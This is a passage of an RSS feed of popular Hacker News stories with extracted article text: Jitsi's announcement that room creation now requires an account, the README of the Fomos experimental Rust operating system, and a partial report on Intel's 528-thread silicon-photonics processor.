<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 30 Aug 2023 09:00:03 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Authentication on meet.jit.si (126 pts)]]></title>
            <link>https://jitsi.org/blog/authentication-on-meet-jit-si/</link>
            <guid>37316959</guid>
            <pubDate>Wed, 30 Aug 2023 02:31:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jitsi.org/blog/authentication-on-meet-jit-si/">https://jitsi.org/blog/authentication-on-meet-jit-si/</a>, See on <a href="https://news.ycombinator.com/item?id=37316959">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<p><span><strong>Blog</strong></span></p>
				
				<h2><span>What’s going on?</span></h2>
<p><span>Starting on August 24th, we will no longer support the anonymous creation of rooms on meet.jit.si, and will require the use of an account (we will be supporting Google, GitHub and Facebook for starters but may modify the list later on). This is a first for us, so users may encounter a few bumps here and there as we are tweaking the experience to make sure there is as little friction as possible on the way into a meeting.&nbsp;</span></p>
<h2><span>Why make a change?</span></h2>
<p><span>When we started the service back in 2013, our goal was to offer a meeting experience with as little friction and as much privacy as possible. We felt and still feel that both of these goals are very important and one of the main reasons that justified the existence of “yet another meeting service.” We wanted people to be able to converse easily and freely, without fear of expressing their views and opinions.</span></p>
<p><span>Our “one tap and you’re in” experience was a big part of our strategy to eliminate friction. We didn’t want people to have to worry about “creating” meetings in advance, remembering passwords, codes or long complicated sequences of numbers for a meeting ID. We wanted users to be able to think of a name and just go there. Through the years we’ve had to compromise on this a little bit. We ended up introducing a pre-meeting device check screen. We felt that checking your camera and microphone before you entered a room could save everyone some hassle so it was worth the pause.&nbsp;</span></p>
<p><span>As for privacy, we previously made sure all communication was always encrypted and we retained no data beyond what is necessary to actually provide a decent meeting service.&nbsp;</span></p>
<p><span>Offering the possibility to anonymously use the service felt like a good way to help with both its privacy and the usability.</span></p>
<p><span>Our commitment to both goals remains as strong as ever but anonymity is no longer going to be one of the tools we use to achieve them.</span></p>
<p><span>Earlier this year we saw an increase in the number of reports we received about some people using our service in ways that we cannot tolerate. To be more clear, this was not about some people merely saying things that others disliked.&nbsp;</span></p>
<p><span>Over the past several months we tried multiple strategies in order to end the violations of our terms of service. However in the end, we determined that requiring authentication was a necessary step to continue operating meet.jit.si.</span></p>
<h2><span>How does this impact user privacy on meet.jit.si?&nbsp;</span></h2>
<p><span>It is a good time to have a look at our </span><a href="https://jitsi.org/meet/privacy"><span>privacy terms</span></a><span>. 8×8 will now store the account responsible for creating rooms. Aside from the changes to our privacy terms referenced above, there is no other change to our meetings. We are still very much committed to holding user privacy in the highest regard and we still have no tools that would allow us to compromise the privacy of the actual audio or video content of a meeting, nor do we intend to create any.</span></p>
<p><span>That said, it is completely understandable that some users may feel uncomfortable using an account to access the service. For such cases we strongly recommend </span><a href="https://jitsi.github.io/handbook/docs/devops-guide/"><span>hosting your own deployment of Jitsi Meet.</span></a><span> We spend a lot of effort to keep that a very simple process and this has always been the mode of use that gives people the highest degree of privacy.</span></p>
<p><span>If you see content that violates the jit.si terms of service you can always </span><a href="https://github.com/jitsi/jitsi-meet/blob/master/SECURITY.md"><span>report it</span></a><span>.</span></p>
<p><span>That’s all we’ve got for now!</span></p>
<p><span>The Jitsi Team</span></p>

							</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Discovery of spherules of likely extrasolar composition in the Pacific Ocean [pdf] (136 pts)]]></title>
            <link>https://lweb.cfa.harvard.edu/~loeb/Interstellar_Expedition.pdf</link>
            <guid>37316831</guid>
            <pubDate>Wed, 30 Aug 2023 02:12:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lweb.cfa.harvard.edu/~loeb/Interstellar_Expedition.pdf">https://lweb.cfa.harvard.edu/~loeb/Interstellar_Expedition.pdf</a>, See on <a href="https://news.ycombinator.com/item?id=37316831">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Fomos: Experimental OS, built with Rust (241 pts)]]></title>
            <link>https://github.com/Ruddle/Fomos</link>
            <guid>37316309</guid>
            <pubDate>Wed, 30 Aug 2023 01:00:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/Ruddle/Fomos">https://github.com/Ruddle/Fomos</a>, See on <a href="https://news.ycombinator.com/item?id=37316309">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">Fomos</h2>
<p dir="auto">Experimental OS, built with Rust</p>
<details open="">
  <summary>
    
    <span aria-label="Video description output.mp4">output.mp4</span>
    <span></span>
  </summary>

  <video src="https://user-images.githubusercontent.com/14235713/264029518-3ee75d5e-5ebe-4cc1-b267-8b73337ee157.mp4" data-canonical-src="https://user-images.githubusercontent.com/14235713/264029518-3ee75d5e-5ebe-4cc1-b267-8b73337ee157.mp4" controls="controls" muted="muted">

  </video>
</details>

<p dir="auto"><strong>Fun fact</strong>: there are 3 apps running in the video. A background app, a cursor app, and a console app.</p>
<h2 tabindex="-1" dir="auto">Why</h2>
<p dir="auto">I wanted to experiment with Non-Unix OS ideas.</p>
<p dir="auto">Exo-kernels are interesting, but it is mostly a theory. This project helps me understand the challenges involved in that pattern.</p>
<p dir="auto">OS development is extremely hard, Rust makes it more bearable.</p>
<h2 tabindex="-1" dir="auto">Features</h2>
<ul dir="auto">
<li>Has a graphical output</li>
<li>Dynamic allocation</li>
<li>Load and run concurrent apps</li>
<li>All apps run in an async loop</li>
<li>Support Virtio mouse and keyboard (drivers are async tasks)</li>
<li>Cooperative scheduling (apps yield control as much as possible)</li>
<li>No context switches once booted</li>
<li><em>Nearly support Virgl</em> ™</li>
</ul>
<p dir="auto">There is 5 examples of apps in this repo named <code>app_*</code>, some in Rust, one in C.
The kernel is in <code>bootloader</code>.</p>
<h2 tabindex="-1" dir="auto">What is unique</h2>
<p dir="auto">The signature of an app in Fomos:</p>
<div dir="auto" data-snippet-clipboard-copy-content="pub extern &quot;C&quot; fn _start(ctx: &amp;mut Context) -> i32"><pre><span>pub</span> <span>extern</span> <span>"C"</span> <span>fn</span> <span>_start</span><span>(</span><span>ctx</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Context</span><span>)</span> -&gt; <span>i32</span><span></span></pre></div>
<p dir="auto">Apps do not need a standard library, any OS functionality is given to the app through the <em>Context</em>.</p>
<p dir="auto">the <em>Context</em> is mostly a pointer to a bag of kernel functionnalities</p>

<p dir="auto">In Fomos, an app is really just a <strong>function</strong>. There is nothing else ! This is a <strong>huge</strong> claim. An executable for a Unix or Windows OS is extremely complex compared to a freestanding function.</p>
<p dir="auto"><code>&lt;rant&gt;</code></p>
<p dir="auto">It is out a frustration for all my Glibc problems during day job dev on linux that I chose to try this approach.</p>
<p dir="auto">I want a flat contract between an app and the OS. So what if an app was a function ? The contract is then <strong>only</strong> the explicit argument type.</p>
<p dir="auto">In Unix, an app has to know the target OS, but also what standard library it uses, that is 2 levels of indirections. Sometimes the os level has a conflict, sometimes the standard library level has a conflict, and sometimes I just don't have the level to understand why something doesn't work. I merely know it is related.</p>
<p dir="auto"><code>&lt;/rant&gt;</code></p>
<p dir="auto">I am trying to know if it is possible to have an OS-App ecosystem that does not suppose <strong>ANY</strong> <strong>implicit</strong> configuration. An app would <strong>JUST</strong> have to handle its explicit <code>start</code> <em>context</em> argument.</p>
<p dir="auto"><em>Context</em> gives any OS function necessary, think alloc, free, access to a framebuffer, or any hardware, any system calls etc.</p>
<p dir="auto">That way, apps could be freestanding, and compatible on multiple OS.</p>
<h3 tabindex="-1" dir="auto">More about Context</h3>
<p dir="auto">Here is the <em>Context</em> for the last version of this OS</p>
<div dir="auto" data-snippet-clipboard-copy-content="#[repr(C)]
pub struct Context<'a, T> {
    pub version: u8,
    pub start_time: u64,
    pub log: extern &quot;C&quot; fn(s: *const u8, l: u32),
    pub pid: u64,
    pub fb: FB<'a>,
    pub calloc: extern &quot;C&quot; fn(usize, usize) -> *mut u8,
    pub cdalloc: extern &quot;C&quot; fn(*mut u8, usize, usize),
    pub store: &amp;'a mut Option<Box<T>>,
    pub input: &amp;'a Input,
}"><pre><span>#<span>[</span>repr<span>(</span><span>C</span><span>)</span><span>]</span></span>
<span>pub</span> <span>struct</span> <span>Context</span><span>&lt;</span><span>'</span><span>a</span><span>,</span> <span>T</span><span>&gt;</span> <span>{</span>
    <span>pub</span> <span>version</span><span>:</span> <span>u8</span><span>,</span>
    <span>pub</span> <span>start_time</span><span>:</span> <span>u64</span><span>,</span>
    <span>pub</span> <span>log</span><span>:</span> <span>extern</span> <span>"C"</span> <span>fn</span><span>(</span><span>s</span><span>:</span> <span>*</span><span>const</span> <span>u8</span><span>,</span> <span>l</span><span>:</span> <span>u32</span><span>)</span><span>,</span>
    <span>pub</span> <span>pid</span><span>:</span> <span>u64</span><span>,</span>
    <span>pub</span> <span>fb</span><span>:</span> <span>FB</span><span>&lt;</span><span>'</span><span>a</span><span>&gt;</span><span>,</span>
    <span>pub</span> <span>calloc</span><span>:</span> <span>extern</span> <span>"C"</span> <span>fn</span><span>(</span><span>usize</span><span>,</span> <span>usize</span><span>)</span> -&gt; <span>*</span><span>mut</span> <span>u8</span><span>,</span>
    <span>pub</span> <span>cdalloc</span><span>:</span> <span>extern</span> <span>"C"</span> <span>fn</span><span>(</span><span>*</span><span>mut</span> <span>u8</span><span>,</span> <span>usize</span><span>,</span> <span>usize</span><span>)</span><span>,</span>
    <span>pub</span> <span>store</span><span>:</span> <span>&amp;</span><span>'</span><span>a</span> <span>mut</span> <span>Option</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>T</span><span>&gt;</span><span>&gt;</span><span>,</span>
    <span>pub</span> <span>input</span><span>:</span> <span>&amp;</span><span>'</span><span>a</span> <span>Input</span><span>,</span>
<span>}</span></pre></div>
<p dir="auto">Note that <code>app_test</code> for instance, uses an old version of the <em>Context</em>, and still works on the newer version of the OS</p>
<p dir="auto">Old Context used by <code>app_test</code>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="#[repr(C)]
pub struct Context<'a> {
    pub version: u8,
    start_time: u64,
    log: extern &quot;C&quot; fn(s: *const u8, l: u32),
    pid: u64,
    fb: FB<'a>,
}"><pre><span>#<span>[</span>repr<span>(</span><span>C</span><span>)</span><span>]</span></span>
<span>pub</span> <span>struct</span> <span>Context</span><span>&lt;</span><span>'</span><span>a</span><span>&gt;</span> <span>{</span>
    <span>pub</span> <span>version</span><span>:</span> <span>u8</span><span>,</span>
    <span>start_time</span><span>:</span> <span>u64</span><span>,</span>
    <span>log</span><span>:</span> <span>extern</span> <span>"C"</span> <span>fn</span><span>(</span><span>s</span><span>:</span> <span>*</span><span>const</span> <span>u8</span><span>,</span> <span>l</span><span>:</span> <span>u32</span><span>)</span><span>,</span>
    <span>pid</span><span>:</span> <span>u64</span><span>,</span>
    <span>fb</span><span>:</span> <span>FB</span><span>&lt;</span><span>'</span><span>a</span><span>&gt;</span><span>,</span>
<span>}</span></pre></div>
<p dir="auto">Meaning Fomos already handles gracefully Apps designed for a much older version of itself. As long as the OS stays compatible with the old stuff in the context, it can add new functionalities for other App by just appending to the context the new functions (here calloc, cdalloc, store, and input).</p>
<p dir="auto"><code>app_test</code> precedes the dynamic allocation age !</p>
<p dir="auto">Could that pattern work in the long term ?</p>
<h3 tabindex="-1" dir="auto">How about system calls</h3>
<p dir="auto">None. Lets try to put everything into <em>Context</em> functions. No voodoo cpu instruction magic.</p>
<blockquote>
<p dir="auto">But how do you give back control to the OS ?</p>
</blockquote>
<p dir="auto">Just</p>

<blockquote>
<p dir="auto">How do you sleep, or wait asynchronously ?</p>
</blockquote>
<p dir="auto">Just</p>

<p dir="auto">Apps are <strong>cooperative</strong> in Fomos, They can just return (which would exit permanently an app on a classic OS), and assume that they are gonna be called through their only function <code>start</code> again soon, maybe even instantly if the "system call" works that way.</p>
<blockquote>
<p dir="auto">But an app loses all RAM data everytime it yields that way !</p>
</blockquote>
<p dir="auto">No, an app can store anything it wants in Context.store during its execution, and get it back every <code>start</code> call. The OS keeps everything in RAM (on the heap). The stack itself is "reset". But it is not more "reset" than it is after any function execution in a normal program. You don't lose anything. In Fomos, apps are merely a single function called multiple times!</p>
<p dir="auto">Over simplification of the kernel loop:</p>
<div dir="auto" data-snippet-clipboard-copy-content="loop {
    for app in apps.iter_mut() {
        app._start(Context::new(...));
    }
}"><pre><span>loop</span> <span>{</span>
    <span>for</span> app <span>in</span> apps<span>.</span><span>iter_mut</span><span>(</span><span>)</span> <span>{</span>
        app<span>.</span><span>_start</span><span>(</span><span>Context</span><span>::</span><span>new</span><span>(</span>..<span>.</span><span></span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span></pre></div>
<p dir="auto">There are a lot of questions without answer yet, but by now you might be curious, what if all the question had an answer in the pattern ? It looks like it could actually work (with a lot of work).</p>
<h2 tabindex="-1" dir="auto">Advantages</h2>
<p dir="auto">A lot of stuff comes free once you accept the premises.</p>
<h4 tabindex="-1" dir="auto">Sandboxing, instrumentation, debugging</h4>
<p dir="auto">Every functionnality and side effect given to an app goes explicitely through the <em>Context</em>. The <em>Context</em> is just a struct, we can wrap or replace anything in it.
Lets instrument an app we'll call <code>special_app</code>. Over simplification :</p>
<div dir="auto" data-snippet-clipboard-copy-content="loop {
    for normal_app in normal_apps.iter_mut() {
        app._start(Context::new(alloc,..));
    }
    // special_app alloc instrumentation
    fn alloc_log(..){log(&quot;allocation detected!&quot;); return alloc(..);}
    special_app._start(Context::new(alloc_log,..));
}"><pre><span>loop</span> <span>{</span>
    <span>for</span> normal_app <span>in</span> normal_apps<span>.</span><span>iter_mut</span><span>(</span><span>)</span> <span>{</span>
        app<span>.</span><span>_start</span><span>(</span><span>Context</span><span>::</span><span>new</span><span>(</span>alloc<span>,</span>..<span>)</span><span>)</span><span>;</span>
    <span>}</span>
    <span>// special_app alloc instrumentation</span>
    <span>fn</span> <span>alloc_log</span><span>(</span>..<span>)</span><span>{</span><span>log</span><span>(</span><span>"allocation detected!"</span><span>)</span><span>;</span> <span>return</span> <span>alloc</span><span>(</span>..<span>)</span><span>;</span><span>}</span>
    special_app<span>.</span><span>_start</span><span>(</span><span>Context</span><span>::</span><span>new</span><span>(</span>alloc_log<span>,</span>..<span>)</span><span>)</span><span>;</span>
<span>}</span></pre></div>
<h4 tabindex="-1" dir="auto">Restart, sleep, change of hardware</h4>
<p dir="auto">An app memory lives in its context. The stack is fleeting. It is reset after each yield and doesn't mean much in Fomos.
Since the <em>Context</em> is explicit, it can be stored. A restart <em>can</em> be made completely transparent to an app.</p>
<p dir="auto">Pseudo code:</p>
<div dir="auto" data-snippet-clipboard-copy-content="//kernel just started
...
let app = App::new(..);
let ctx = disk.load(app.id).unwrap_or(Context::new(..));
loop{
    app._start(ctx);
    if restart_request{
        disk.save(app.id, ctx)
        break;
    }
}
//handle restart
..."><pre><span>//kernel just started</span>
..<span>.</span>
<span>let</span> app = <span>App</span><span>::</span><span>new</span><span>(</span>..<span>)</span><span>;</span>
<span>let</span> ctx = disk<span>.</span><span>load</span><span>(</span>app<span>.</span><span>id</span><span>)</span><span>.</span><span>unwrap_or</span><span>(</span><span>Context</span><span>::</span><span>new</span><span>(</span>..<span>)</span><span>)</span><span>;</span>
<span>loop</span><span>{</span>
    app<span>.</span><span>_start</span><span>(</span>ctx<span>)</span><span>;</span>
    <span>if</span> restart_request<span>{</span>
        disk<span>.</span><span>save</span><span>(</span>app<span>.</span><span>id</span><span>,</span> ctx<span>)</span>
        break<span>;</span>
    <span>}</span>
<span>}</span>
<span>//handle restart</span>
...</pre></div>
<p dir="auto">Quickload and quicksave of an app complete state is trivial.
Note that some change of hardware could make an app bug. It would be a problem if it was transparent. However, it could be made opaque and obvious, in an opt-in manner, again through the <em>Context</em>.</p>
<h2 tabindex="-1" dir="auto">Disadvantages</h2>
<h3 tabindex="-1" dir="auto">Security</h3>
<p dir="auto">Right now it is not implemented, any app can casually check the ram of another app ^^. This is going to be a hard problem to solve. I have plans to have data security without context switch, and without giving every damn app its own virtual memory stack.</p>
<h3 tabindex="-1" dir="auto">Cooperative vs preemptive scheduling</h3>
<p dir="auto">The argument that a cooperative scheduling is doomed to fail is overblown. Apps are already very much cooperative.
For proof, run a version of that on your nice preemptive system :</p>
<div dir="auto" data-snippet-clipboard-copy-content="while(true){
  new Thread( () => {
    fs.writeFile(&quot;/home/&quot;+randomString(),randomString())
    malloc(randomInt())
    curl(&quot;http://&quot;+randomString()+&quot;.com&quot;)
  }  
}"><pre><span>while</span><span>(</span><span>true</span><span>)</span><span>{</span>
  <span>new</span> <span>Thread</span><span>(</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>fs</span><span>.</span><span>writeFile</span><span>(</span><span>"/home/"</span><span>+</span><span>randomString</span><span>(</span><span>)</span><span>,</span><span>randomString</span><span>(</span><span>)</span><span>)</span>
    <span>malloc</span><span>(</span><span>randomInt</span><span>(</span><span>)</span><span>)</span>
    <span>curl</span><span>(</span><span>"http://"</span><span>+</span><span>randomString</span><span>(</span><span>)</span><span>+</span><span>".com"</span><span>)</span>
  <span>}</span>  
<span>}</span></pre></div>
<ul dir="auto">
<li>Blender does a compelling impression of that when you increase the level of details one too many times. Might fill your swap and crash unsaved work on other apps.</li>
<li>Badly written Webgl websites crash my gpu driver.</li>
</ul>
<p dir="auto">Not only is preemptive scheduling not enough, IMO it is not necessary. Also it is a spectrum. A system can be optimistically cooperative, and turn preemptive pessimistically.</p>
<p dir="auto">However the ecosystem is made for preemptive OS. There is friction in doing things differently.</p>
<h2 tabindex="-1" dir="auto">Missing</h2>
<ul dir="auto">
<li>Permanent storage (should be easy since virtio is already implemented)</li>
<li>Gpu support (virgl wip)</li>
<li>Networking</li>
<li>A nice abstraction for apps to share data and functionnalities between themselves</li>
</ul>
<p dir="auto">The rest should live in userland.</p>
<h2 tabindex="-1" dir="auto">Building</h2>
<p dir="auto">On a linux, run</p>

<p dir="auto"><em>You might need rust nightly, gcc, qemu with virgl &amp; sdl flag</em></p>
<h2 tabindex="-1" dir="auto">Credit</h2>
<p dir="auto">Heavily inspired by <a href="https://os.phil-opp.com/" rel="nofollow">Philipp Oppermann's blog</a>.</p>
<p dir="auto">Thanks to <a href="https://github.com/darbysauter/myOS">darbysauter</a> for the advice given.</p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Intel shows 8 core 528 thread processor with silicon photonics (325 pts)]]></title>
            <link>https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/</link>
            <guid>37315802</guid>
            <pubDate>Tue, 29 Aug 2023 23:56:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/">https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/</a>, See on <a href="https://news.ycombinator.com/item?id=37315802">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA.jpg" data-caption="Intel 8 Core 528 Thread Chip With Optical Networking For DARPA"><img width="696" height="578" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA-696x578.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA-696x578.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA-362x300.jpg 362w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA-800x664.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA-506x420.jpg 506w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA.jpg 1034w" sizes="(max-width: 696px) 100vw, 696px" alt="Intel 8 Core 528 Thread Chip With Optical Networking For DARPA" title="Intel 8 Core 528 Thread Chip With Optical Networking For DARPA"></a><figcaption>Intel 8 Core 528 Thread Chip With Optical Networking For DARPA</figcaption></figure></div>
            <!-- content --><p>Intel had a cool technology on display at Hot Chips 2023, beyond just server chips. It had a direct mesh-to-mesh optical fabric. What might also be interesting is the 8-core processor with 66 threads per core.</p>
<p>Again, please excuse typos, these are being done live.<span id="more-72371"></span></p>
<h2>Intel Shows the First Direct Mesh-to-Mesh Optical Fabric</h2>
<p>The key motivation behind this was the DARPA HIVE program for hyper-sparse data.</p>
<figure id="attachment_72372" aria-describedby="caption-attachment-72372"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_03/" rel="attachment wp-att-72372"><img src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-800x476.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_03" width="696" height="414" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-800x476.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-400x238.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-1536x914.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-696x414.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-1068x635.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-706x420.jpg 706w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03.jpg 1627w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72372">Intel Direct Mesh To Mesh Optical Fabric_Page_03</figcaption></figure>
<p>When Intel profiled the workloads that DARPA was looking at, they found they were massively parallel. Still, they had poor cache line utilization and things like big long out-of-order pipelines were not well utilized.</p>
<figure id="attachment_72373" aria-describedby="caption-attachment-72373"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_04/" rel="attachment wp-att-72373"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_04" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-747x420.jpg 747w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04.jpg 2000w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72373">Intel Direct Mesh To Mesh Optical Fabric_Page_04</figcaption></figure>
<p>Here is an interesting one. Intel has a 66-thread-per-core processor with 8 cores in a socket (528 threads?) The cache apparently is not well used due to the workload. This is a RISC ISA not x86.</p>
<figure id="attachment_72374" aria-describedby="caption-attachment-72374"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_05/" rel="attachment wp-att-72374"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_05" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72374">Intel Direct Mesh To Mesh Optical Fabric_Page_05</figcaption></figure>
<p>Intel is packing these into 16 sockets in a single OCP compute thread and using optical networking.</p>
<p>Here is the die architecture. Each core has multi-threaded pipelines.</p>
<figure id="attachment_72375" aria-describedby="caption-attachment-72375"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_06/" rel="attachment wp-att-72375"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_06" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72375">Intel Direct Mesh To Mesh Optical Fabric_Page_06</figcaption></figure>
<p>The high-speed I/O chips bridge the electrical to optical capabilities of the chip.</p>
<p>Here is the 10-port cut-through router being used.</p>
<figure id="attachment_72376" aria-describedby="caption-attachment-72376"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_07/" rel="attachment wp-att-72376"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_07" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-747x420.jpg 747w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07.jpg 2000w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72376">Intel Direct Mesh To Mesh Optical Fabric_Page_07</figcaption></figure>
